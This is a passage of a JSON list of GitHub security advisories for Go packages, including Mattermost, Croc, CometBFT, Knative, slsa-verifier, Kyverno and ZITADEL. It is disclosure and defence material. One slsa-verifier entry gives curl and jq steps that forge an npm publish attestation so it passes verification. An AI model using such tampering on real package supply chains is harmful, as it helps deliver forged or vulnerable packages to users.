"github.com/schollz/croc/v9"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"last_affected": "9.6.5"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-43619"}, {"type": "WEB", "url": "https://github.com/schollz/croc/issues/593"}, {"type": "PACKAGE", "url": "https://github.com/schollz/croc"}, {"type": "WEB", "url": "https://www.openwall.com/lists/oss-security/2023/09/08/2"}, {"type": "WEB", "url": "http://www.openwall.com/lists/oss-security/2023/09/21/5"}], "database_specific": {"cwe_ids": [], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-09-21T16:59:57Z", "nvd_published_at": "2023-09-20T06:15:10Z"}}, {"schema_version": "1.4.0", "id": "GHSA-h69v-mvh9-hfrq", "modified": "2023-10-03T21:16:24Z", "published": "2023-09-29T12:30:16Z", "aliases": ["CVE-2023-5194"], "summary": "Mattermost Incorrect Authorization vulnerability", "details": "Mattermost fails to properly validate permissions when demoting and deactivating a user allowing for a\u00a0system/user manager to demote / deactivate another manager\n\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost/server/v8"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "8.1.0"}, {"fixed": "8.1.1"}]}], "versions": ["8.1.0"]}, {"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost/server/v8"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "8.0.0"}, {"fixed": "8.0.2"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost-server/v6"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "7.8.10"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-5194"}, {"type": "PACKAGE", "url": "https://github.com/mattermost/mattermost"}, {"type": "WEB", "url": "https://mattermost.com/security-updates"}], "database_specific": {"cwe_ids": ["CWE-863"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-09-29T22:05:48Z", "nvd_published_at": "2023-09-29T10:15:10Z"}}, {"schema_version": "1.4.0", "id": "GHSA-8c8w-f7wp-2jr2", "modified": "2023-09-21T17:00:17Z", "published": "2023-09-20T06:30:50Z", "aliases": ["CVE-2023-43616"], "summary": "Sender can cause a receiver to overwrite files during ZIP extraction in Croc", "details": "An issue was discovered in Croc through 9.6.5. A sender can cause a receiver to overwrite files during ZIP extraction.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/schollz/croc"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"last_affected": "9.6.5"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-43616"}, {"type": "WEB", "url": "https://github.com/schollz/croc/issues/594"}, {"type": "PACKAGE", "url": "https://github.com/schollz/croc"}, {"type": "WEB", "url": "https://www.openwall.com/lists/oss-security/2023/09/08/2"}, {"type": "WEB", "url": "http://www.openwall.com/lists/oss-security/2023/09/21/5"}], "database_specific": {"cwe_ids": ["CWE-22"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-09-21T17:00:17Z", "nvd_published_at": "2023-09-20T06:15:10Z"}}, {"schema_version": "1.4.0", "id": "GHSA-hq58-p9mv-338c", "modified": "2023-09-29T20:38:40Z", "published": "2023-09-29T20:38:40Z", "aliases": [], "summary": "CometBFT's default for `BlockParams.MaxBytes` consensus parameter may increase block times and affect consensus participation", "details": "## Amulet Security Advisory for CometBFT: ASA-2023-002\n\n**Component**: CometBFT\n**Criticality:** Low\n**Affected versions:** All\n**Affected users:** Validators, Chain Builders + Maintainers\n\n# Summary\n\nA default configuration in CometBFT has been found to be large for common use cases, and may affect block times and consensus participation when fully utilized by chain participants. It is advised that chains consider their specific needs for their use case when setting the `BlockParams.MaxBytes` consensus parameter. Chains are encouraged to evaluate the impact of having proposed blocks with the maximum allowed block size, especially on bandwidth usage and block latency. Additionally, the `timeout_propose` parameter should be computed using the maximum allowed block size as a reference. This issue does not represent an actively exploitable vulnerability that would result in a direct loss of funds, however it may have a slight impact on block latency depending on a network\u2019s topography.\n\nWhen setting a large `BlockParams.MaxBytes`, there are two main implications:\n* Increased bandwidth to propagate a block\n* Increased latency to propagate a block\n\nWhen combined, this may result in less round participation, and in some cases additional rounds may be required to meet the consensus threshold, which could lead to timeouts depending on the topography of a network and environmental factors. These factors can include the number of validators on a network, geographic distribution, network connectivity (including latency, bandwidth, and reachability), the functionality of the modules implementing the logic for a transaction in your chain, etc.\u00a0 The cost to propagate a 21MB block, the default value for `BlockParams.MaxBytes`, will be far higher than the cost of propagating a smaller 1MB block.\u00a0CometBFT recommends tuning this parameter to a smaller limit if full initial-round participation is an important quality for your chain.\n\n# Considerations\nCometBFT is designed to be configurable by chains, and implements many different configuration variables and parameters to allow chain developers, validators, node operators, and chain participants to customize it best to their use case. A high-performing validator may find it necessary to experiment with tuning local configuration, optimizing network and compute resources, and implementing controls to inhibit spam.\n\n\n# Next Steps for Chains and Validators\n\nTo increase awareness of the potential impacts of this default parameter, the CometBFT team has updated the documentation (https://github.com/cometbft/cometbft/pull/1405, [v0.34.x](https://docs.cometbft.com/v0.34/spec/abci/apps#blockparamsmaxbytes), [v0.37.x](https://docs.cometbft.com/v0.37/spec/abci/abci++_app_requirements#blockparamsmaxbytes), [v0.38.x](https://docs.cometbft.com/v0.38/spec/abci/abci++_app_requirements#blockparamsmaxbytes)) for builders and maintainers of chain applications. Additionally, it is recommended that:\n\n\n* Chain ecosystems and their maintainers set a `BlockParams.MaxBytes` configuration appropriate for their use case at the application level; in some cases, fine-tuning `BlockParams` may require a network upgrade.\n* Chain ecosystems and their maintainers evaluate how gas is used and required on their chain, including gas and fee parameters, no-fee or fee-exempt message policies, and ensure that any custom modules integrate with the gas and fee frameworks. This is especially important for chains that may have implemented custom modules or functionality to allow IBC messages to bypass fees.\n* Chain ecosystems and their maintainers audit all of their currently-set parameters and configurations to ensure that they are appropriate for their use case.\n\n* All validators develop and implement anti-spam measures on their nodes. Amulet encourages validators to form working groups to collaborate on spam prevention and on tooling that can be implemented by node operators across the Interchain.\n* All validators consider developing and implementing tooling that would allow them to sample incoming transactions to enable them to fine-tune the level of service they would like to provide to be resilient in slowdown scenarios. Amulet also encourages validators to collaborate on tooling that can be implemented by node operators across the Interchain.\n\n\nThe CometBFT team has also revisited all the checks performed by the consensus protocol regarding proposed blocks. This investigation has confirmed that proposed blocks with size exceeding the `BlockParams.MaxBytes` limit established by the application are not accepted by nodes. The team notwithstanding has decided to introduce additional sanity checks for the size of proposed blocks (https://github.com/cometbft/cometbft/pull/1408), allowing for an early identification and rejection of invalid or oversized blocks. These code changes will be included in the _next_ release of each branch of CometBFT.\n\nAs more chains adopt the Interchain Stack for new and cutting-edge use cases, the CometBFT team recommends that all chains regularly evaluate their parameters and configurations to ensure they meet the needs of their ecosystem as their networks mature.\u00a0\n\n\nFor more information about CometBFT, see [https://docs.cometbft.com](https://docs.cometbft.com/). \n\n\n\n\n\nThis issue was raised by Notional labs, who reported it via the vulnerability disclosure channel at [security@interchain.io](mailto:security@interchain.io) on Friday, September 23, 2023. If you believe you have found a bug in the Interchain Stack or would like to contribute to the program by reporting a bug, please see [https://hackerone.com/cosmos](https://hackerone.com/cosmos).\u00a0\n\n\n*****\n\n \nNote from Amulet on the Security Advisory Process:\n\n\nIn the interest of timely resolution of this issue for validators and node operators, the Amulet team has chosen to use existing processes and resources for distributing security advisories within the Cosmos and Interchain Ecosystems. Stay tuned as we implement an improved, more robust security advisory distribution system that will provide equitable access to information about security issues in the Interchain Stack.", "severity": [], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/cometbft/cometbft"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"last_affected": "0.38.0"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/cometbft/cometbft/security/advisories/GHSA-hq58-p9mv-338c"}, {"type": "WEB", "url": "https://github.com/cometbft/cometbft/pull/1405"}, {"type": "WEB", "url": "https://docs.cometbft.com/v0.34/spec/abci/apps#blockparamsmaxbytes"}, {"type": "WEB", "url": "https://docs.cometbft.com/v0.37/spec/abci/abci++_app_requirements#blockparamsmaxbytes"}, {"type": "WEB", "url": "https://docs.cometbft.com/v0.38/spec/abci/abci++_app_requirements#blockparamsmaxbytes"}, {"type": "PACKAGE", "url": "https://github.com/cometbft/cometbft"}], "database_specific": {"cwe_ids": [], "severity": "LOW", "github_reviewed": true, "github_reviewed_at": "2023-09-29T20:38:40Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-c37r-v8jx-7cv2", "modified": "2023-11-28T20:49:59Z", "published": "2023-11-27T12:30:54Z", "aliases": ["CVE-2023-40703"], "summary": "Mattermost Uncontrolled Resource Consumption vulnerability", "details": "Mattermost fails to properly limit the characters allowed in different fields of a block in Mattermost Boards allowing\u00a0a attacker to\u00a0consume excessive resources, possibly leading to Denial of Service, by\u00a0patching the field of a block using a specially crafted string.\u00a0\n\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost/server/v8"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "9.1.0"}, {"fixed": "9.1.1"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost/server/v8"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "9.0.0"}, {"fixed": "9.0.2"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost/server/v8"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "8.1.4"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost-server/v6"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "7.8.13"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-40703"}, {"type": "PACKAGE", "url": "https://github.com/mattermost/mattermost"}, {"type": "WEB", "url": "https://mattermost.com/security-updates"}], "database_specific": {"cwe_ids": ["CWE-400"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-11-28T20:49:59Z", "nvd_published_at": "2023-11-27T10:15:07Z"}}, {"schema_version": "1.4.0", "id": "GHSA-jjr7-372r-cx7x", "modified": "2023-11-28T20:49:56Z", "published": "2023-11-27T12:30:54Z", "aliases": ["CVE-2023-43754"], "summary": "Mattermost Exposure of Sensitive Information to an Unauthorized Actor vulnerability", "details": "Mattermost fails to check whether the\u00a0\"Allow users to view archived channels\"\u00a0setting is enabled during permalink previews display, allowing members to view permalink previews of archived channels even if the\u00a0\"Allow users to view archived channels\" setting is disabled.\u00a0\n\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost/server/v8"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "9.1.0"}, {"fixed": "9.1.1"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost/server/v8"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "9.0.0"}, {"fixed": "9.0.2"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost/server/v8"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "8.1.4"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost-server/v6"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "7.8.13"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-43754"}, {"type": "PACKAGE", "url": "https://github.com/mattermost/mattermost"}, {"type": "WEB", "url": "https://mattermost.com/security-updates"}], "database_specific": {"cwe_ids": ["CWE-200"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-11-28T20:49:56Z", "nvd_published_at": "2023-11-27T10:15:07Z"}}, {"schema_version": "1.4.0", "id": "GHSA-xvq6-h898-wcj8", "modified": "2023-11-08T14:53:27Z", "published": "2023-11-06T18:30:19Z", "aliases": ["CVE-2023-5967"], "summary": "Mattermost denial of service vulnerability", "details": "Mattermost fails to properly validate requests to the Calls plugin, allowing an attacker sending a request without a User Agent header to cause a panic and crash the Calls plugin\n\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost-server/v6"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "7.8.12"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost/server/v8"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "8.0.0"}, {"fixed": "8.0.4"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost/server/v8"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "8.1.0"}, {"fixed": "8.1.3"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost/server/v8"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "9.0.0"}, {"fixed": "9.0.1"}]}], "versions": ["9.0.0"]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-5967"}, {"type": "PACKAGE", "url": "https://github.com/mattermost/mattermost"}, {"type": "WEB", "url": "https://mattermost.com/security-updates"}], "database_specific": {"cwe_ids": ["CWE-754"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-11-08T14:53:27Z", "nvd_published_at": "2023-11-06T16:15:42Z"}}, {"schema_version": "1.4.0", "id": "GHSA-jj46-9cgh-qmfx", "modified": "2023-11-28T20:50:05Z", "published": "2023-11-27T12:30:54Z", "aliases": ["CVE-2023-47865"], "summary": "Mattermost Improper Access Control vulnerability", "details": "Mattermost fails to check if hardened mode is enabled when overriding the username and/or the icon when posting a post. If settings allowed integrations to override the username and profile picture when posting, a member could also override the username and icon when making a post even if the Hardened Mode setting was enabled\n\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost/server/v8"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "8.1.4"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost-server/v6"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "7.8.13"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-47865"}, {"type": "PACKAGE", "url": "https://github.com/mattermost/mattermost"}, {"type": "WEB", "url": "https://mattermost.com/security-updates"}], "database_specific": {"cwe_ids": ["CWE-284"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-11-28T20:50:05Z", "nvd_published_at": "2023-11-27T09:15:32Z"}}, {"schema_version": "1.4.0", "id": "GHSA-3f2q-6294-fmq5", "modified": "2023-11-28T23:14:24Z", "published": "2023-11-18T00:30:17Z", "aliases": ["CVE-2023-46402"], "summary": "Inefficient Regular Expression Complexity in git-urls", "details": "git-urls version 1.0.1 is vulnerable to ReDOS (Regular Expression Denial of Service) in Go package.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/whilp/git-urls"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"last_affected": "1.0.1"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-46402"}, {"type": "WEB", "url": "https://gist.github.com/6en6ar/7c2424c93e7fbf2b6fc44e7fb9acb95d"}, {"type": "PACKAGE", "url": "https://github.com/whilp/git-urls"}], "database_specific": {"cwe_ids": ["CWE-1333"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-11-20T23:05:38Z", "nvd_published_at": "2023-11-18T00:15:07Z"}}, {"schema_version": "1.4.0", "id": "GHSA-r67m-mf7v-qp7j", "modified": "2023-11-27T21:26:53Z", "published": "2023-11-06T18:30:19Z", "aliases": ["CVE-2023-5968"], "summary": "Mattermost password hash disclosure vulnerability", "details": "Mattermost fails to properly sanitize the user object when updating the username, resulting in the password hash being included in the response body.\u00a0\n\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost-server/v6"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "7.8.12"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost/server/v8"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "8.0.0"}, {"fixed": "8.0.4"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost/server/v8"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "8.1.0"}, {"fixed": "8.1.3"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost/server/v8"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "9.0.0"}, {"fixed": "9.0.1"}]}], "versions": ["9.0.0"]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-5968"}, {"type": "WEB", "url": "https://github.com/mattermost/mattermost/pull/24362"}, {"type": "WEB", "url": "https://github.com/mattermost/mattermost/pull/24566"}, {"type": "WEB", "url": "https://github.com/mattermost/mattermost/commit/698f4a97da564e2c1f2bf1fbd01755cefa3b7881"}, {"type": "PACKAGE", "url": "https://github.com/mattermost/mattermost"}, {"type": "WEB", "url": "https://mattermost.com/security-updates"}], "database_specific": {"cwe_ids": ["CWE-116", "CWE-200"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-11-08T14:58:02Z", "nvd_published_at": "2023-11-06T16:15:42Z"}}, {"schema_version": "1.4.0", "id": "GHSA-j4c3-3h73-74m9", "modified": "2023-11-28T20:47:58Z", "published": "2023-11-27T12:30:54Z", "aliases": ["CVE-2023-48268"], "summary": "Mattermost Uncontrolled Resource Consumption vulnerability", "details": "Mattermost fails to\u00a0limit the amount of data extracted from compressed archives during board import in Mattermost Boards\u00a0allowing an attacker to consume excessive resources, possibly leading to Denial of Service, by\u00a0importing a board using a specially crafted zip (zip bomb).\n\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost/server/v8"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "9.1.0"}, {"fixed": "9.1.1"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost/server/v8"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "9.0.0"}, {"fixed": "9.0.2"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost/server/v8"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "8.1.4"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost-server/v6"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "7.8.13"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-48268"}, {"type": "PACKAGE", "url": "https://github.com/mattermost/mattermost"}, {"type": "WEB", "url": "https://mattermost.com/security-updates"}], "database_specific": {"cwe_ids": ["CWE-400"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-11-28T20:47:58Z", "nvd_published_at": "2023-11-27T10:15:08Z"}}, {"schema_version": "1.4.0", "id": "GHSA-qmvj-4qr9-v547", "modified": "2023-12-04T15:16:16Z", "published": "2023-11-27T23:27:04Z", "aliases": ["CVE-2023-48713"], "summary": "Knative Serving vulnerable to attacker-controlled pod causing denial of service of autoscaler", "details": "### Summary\nA vulnerability was fond in Knative Serving that could allow an attacker to crash the Knative Serving autoscaler resulting in a denial of service. The attacker would need to have compromised one pod in the Knative Serving deployment, and with that position they could launch the attack against the autoscaler. \nWhen the autoscaler scrapes the metrics of pods, it sends a request to the `/metrics` endpoint of each pod and reads the response. The attacker would need to detect the request from the autoscaler to the `/metrics` endpoint of the pod they had compromised and send a malicious response back to the autoscaler. At this point, the autoscaler would crash. The root cause of the vulnerability was a memory exhaustion issue in the autoscaler that the attacker could trigger with the malicious reponse.\n\nThe vulnerability would allow a privilege escalation by the attacker from controlling one point to having negative impact on the entire Knative Serving deployment.\n\n### Impact\nAll users are vulnerable to this; Users that have not had any of their pods compromised are not at risk of this vulnerability.  \n\n### Mitigation\nThe vulnerability has been patched in v1.10.5, v1.11.3 and v1.12.0\n\n### Credits\nThe vulnerability was reported by Ada Logics during an ongoing security audit of Knative involving Ada Logics, the Knative maintainers, OSTIF and CNCF.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "knative.dev/serving"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.39.0"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/knative/serving/security/advisories/GHSA-qmvj-4qr9-v547"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-48713"}, {"type": "WEB", "url": "https://github.com/knative/serving/commit/012ee2509231b80b7842139bfabc30516d3026ca"}, {"type": "WEB", "url": "https://github.com/knative/serving/commit/101f814112b9ca0767f457e7e616b46205551cf1"}, {"type": "WEB", "url": "https://github.com/knative/serving/commit/fff40ef7bac9be8380ec3d1c70fc15b57093382a"}, {"type": "PACKAGE", "url": "https://github.com/knative/serving"}], "database_specific": {"cwe_ids": ["CWE-400"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-11-27T23:27:04Z", "nvd_published_at": "2023-11-28T04:15:07Z"}}, {"schema_version": "1.4.0", "id": "GHSA-r2xv-vpr2-42m9", "modified": "2023-11-09T16:14:39Z", "published": "2023-11-08T19:15:55Z", "aliases": [], "summary": "slsa-verifier vulnerable to mproper validation of npm's publish attestations", "details": "### Summary\n\n`slsa-verifier<=2.4.0` does not correctly verify npm's [publish](https://github.com/npm/attestation/tree/main/specs/publish/v0.1) attestations signature.\n\n### Proof of concept\n\nSteps to reproduce:\n1. `curl -Sso attestations.json $(npm view @trishankatdatadog/supreme-goggles --json | jq -r '.dist.attestations.url')`\n2. `curl -Sso supreme-goggles.tgz \"$(npm view @trishankatdatadog/supreme-goggles --json | jq -r '.dist.tarball')\"`\n3. In `attestations.json`, take the value addressed by the `jq` selector `.attestations[0].bundle.dsseEnvelope.payload`, base64decode it, tamper with it, base64encode that, and replace the original value with that. Save the file as `attestations_tampered.json`.\n   Here is an example command to replace the package name with `@attacker/malicious`:\n   `jq -r \".attestations[0].bundle.dsseEnvelope.payload = \\\"$(jq -r '.attestations[0].bundle.dsseEnvelope.payload | @base64d' < attestations.json | jq '.subject[0].name = \"pkg:npm/%40attacker/malicious\"' | base64 -w0)\\\"\" < attestations.json > attestations_tampered.json`\n5. `SLSA_VERIFIER_EXPERIMENTAL=1 slsa-verifier verify-npm-package supreme-goggles.tgz --attestations-path attestations_tampered.json --builder-id \"https://github.com/actions/runner/github-hosted\" --package-name \"@trishankatdatadog/supreme-goggles\" --package-version 1.0.5 --source-uri github.com/trishankatdatadog/supreme-goggles`\n6. The result is that `slsa-verifier` fails to detect this tampering of the publish attestation (unlike with the provenance attestation) and returns `PASSED`.\n\n### Impact\n\nAn attacker who controls what packages and attestations are shown to a user _can_ associate a package with an arbitrary name and version that do _not_ match what the user expects from the publish attestation. Furthermore, the package digest in the publish attestation need _not_ match its counterpart in the provenance attestation. However, the attacker _cannot_ associate the given package with an arbitrary source and builder that the user does not expect from the provenance attestation. Thus, the attacker could, for example, convince package managers to install authentic but older versions of packages that contain known, exploitable vulnerabilities.\n\nSeverity is considered low because 1) it does not invalidate the provenance and 2) support for npm is currently experimental.\n\n### Patches\n\nFixed by PR [#705](https://github.com/slsa-framework/slsa-verifier/pull/705) and released in versions `>=2.4.1`.\n\n### Workarounds\n\nThere is no easy way for users to fix or remediate this vulnerability without upgrading, short of verifying npm's publish attestations themselves, _and_ cross-verifying it against GHA's provenance attestations.\n\n### References\n\n* [Original OpenSSF Slack thread](https://openssf.slack.com/archives/C03PDLFET5W/p1695330038983179)\n", "severity": [], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/slsa-framework/slsa-verifier/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.4.1-rc.0"}]}], "database_specific": {"last_known_affected_version_range": "<= 2.4.0"}}, {"package": {"ecosystem": "Go", "name": "github.com/slsa-framework/slsa-verifier"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"last_affected": "1.4.1"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/slsa-framework/slsa-verifier/security/advisories/GHSA-r2xv-vpr2-42m9"}, {"type": "WEB", "url": "https://github.com/slsa-framework/slsa-verifier/pull/705"}, {"type": "WEB", "url": "https://github.com/slsa-framework/slsa-verifier/commit/f6ae402f458b347d2c414f1d053fc1f8257888d0"}, {"type": "WEB", "url": "https://github.com/npm/attestation/tree/main/specs/publish/v0.1"}, {"type": "PACKAGE", "url": "https://github.com/slsa-framework/slsa-verifier"}, {"type": "WEB", "url": "https://openssf.slack.com/archives/C03PDLFET5W/p1695330038983179"}], "database_specific": {"cwe_ids": [], "severity": "LOW", "github_reviewed": true, "github_reviewed_at": "2023-11-08T19:15:55Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-3hfq-cx9j-923w", "modified": "2023-11-14T22:20:09Z", "published": "2023-11-14T22:20:09Z", "aliases": ["CVE-2023-47630"], "summary": "Attacker can cause Kyverno user to unintentionally consume insecure image", "details": "An issue was found in Kyverno that allowed an attacker to control the digest of images used by Kyverno users. The issue would require the attacker to compromise the registry that the Kyverno fetch their images from. The attacker could then return a vulnerable image to the the user and leverage that to further escalate their position. As such, the attacker would need to know which images the Kyverno user consumes and know of one of multiple exploitable vulnerabilities in previous digests of the images. Alternatively, if the attacker has compromised the registry, they could craft a malicious image with a different digest with intentionally placed vulnerabilities and deliver the image to the user. \n\nAn attacker was not be able to control other parameters of the image than the digest by exploiting this vulnerability.\n\nUsers pulling their images from trusted registries are not impacted by this vulnerability. There is no evidence of this being exploited in the wild.\n\nThe issue has been patched in 1.11.0. \n\nThe vulnerability was found during an ongoing security audit of Kyverno conducted by Ada Logics, facilitated by OSTIF and funded by the CNCF.\n\nMembers of the community have raised concerns over the similarity between this vulnerability and the one identified with CVE-2023-46737; They are two different issues with two different root causes and different levels of impact. Some differences are:\n\n- The current advisory (GHSA-3hfq-cx9j-923w) has its root cause in Kyverno whereas the root cause of CVE-2023-46737 is in Cosigns code base. \n- The impact of the current advisory (GHSA-3hfq-cx9j-923w) is that an attacker can trick Kyverno into consuming a different image than the one the user requested; The impact of CVE-2023-46737 is an endless data attack resulting in a denial-of-service.\n- The fix of the current advisory (GHSA-3hfq-cx9j-923w) does not result in users being secure from CVE-2023-46737 and vice versa.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/kyverno/kyverno"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.10.5"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/kyverno/kyverno/security/advisories/GHSA-3hfq-cx9j-923w"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-47630"}, {"type": "PACKAGE", "url": "https://github.com/kyverno/kyverno"}, {"type": "WEB", "url": "https://github.com/kyverno/kyverno/releases/tag/v1.11.0"}], "database_specific": {"cwe_ids": ["CWE-200", "CWE-345"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-11-14T22:20:09Z", "nvd_published_at": "2023-11-14T21:15:13Z"}}, {"schema_version": "1.4.0", "id": "GHSA-7h8m-vrxx-vr4m", "modified": "2023-11-09T16:14:18Z", "published": "2023-11-08T17:52:50Z", "aliases": ["CVE-2023-47111"], "summary": "ZITADEL race condition in lockout policy execution", "details": "### Impact\n\nZITADEL provides administrators the possibility to define a `Lockout Policy` with a maximum amount of failed password check attempts. On every failed password check, the amount of failed checks is compared against the configured maximum.\nExceeding the limit, will lock the user and prevent further authentication.\n\nIn the affected implementation it was possible for an attacker to start multiple parallel password checks, giving him the possibility to try out more combinations than configured in the `Lockout Policy`.\n\n### Patches\n\n2.x versions are fixed on >= 